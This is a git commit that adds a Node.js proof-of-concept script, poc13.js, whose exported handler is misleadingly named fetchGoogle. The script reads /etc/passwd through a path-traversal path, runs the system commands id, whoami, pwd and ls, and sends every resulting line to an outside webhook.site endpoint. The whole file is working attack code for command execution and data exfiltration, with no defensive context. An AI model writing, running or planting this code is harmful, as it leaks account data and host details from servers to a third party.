6e583ba4bae6728de29cf664203ee098284d78ed
Sarp Dora Yönden <69794292+sarpdora23@users.noreply.github.com>
2024-06-23 20:35:04 +0300

    Update and rename poc12.js to poc13.js

---
+++ poc13.js
@@ -0,0 +1,57 @@
+const fs = require('fs');
+const fetch = require('node-fetch');
+const { exec } = require('child_process');
+
+function fetchGoogle(ctx, req, res) {
+    fs.readFile('../../../../../../../etc/passwd', 'utf8', (err, data) => {
+        if (err) {
+            res.status(500).send('Error reading file: ' + err.message);
+            return;
+        }
+        
+        const lines = data.split('\n').map(line => line.trim()).filter(line => line); // Dosyanın tüm satırlarını al ve boş satırları filtrele
+
+        const commands = ['id', 'whoami', 'pwd', 'ls'];
+        const commandPromises = commands.map(command => 
+            new Promise((resolve, reject) => {
+                exec(command, (error, stdout, stderr) => {
+                    if (error) {
+                        reject(`Error executing ${command}: ${stderr}`);
+                    } else {
+                        resolve(stdout.trim());
+                    }
+                });
+            })
+        );
+
+        Promise.all(commandPromises)
+            .then(commandOutputs => {
+                const allLines = [...lines, ...commandOutputs]; // Dosya satırları ve komut çıktılarını birleştir
+                
+                const fetchPromises = allLines.map(line => 
+                    fetch(`https://webhook.site/0ccbcbcc-7da3-4759-9855-ac1dc992520a/${line}`, {
+                        method: 'GET',
+                        headers: {
+                            'Content-Type': 'text/html',
+                        },
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            throw new Error('Network response was not ok ' + response.statusText);
+                        }
+                        return response.text();
+                    })
+                );
+
+                return Promise.all(fetchPromises);
+            })
+            .then(responses => {
+                res.status(200).send(responses.join('\n'));  // Başarılı yanıtları birleştir ve gönder
+            })
+            .catch(error => {
+                res.status(500).send('Fetch error: ' + error.message);  // Hata durumunda yanıt gönder
+            });
+    });
+}
+
+module.exports = fetchGoogle;
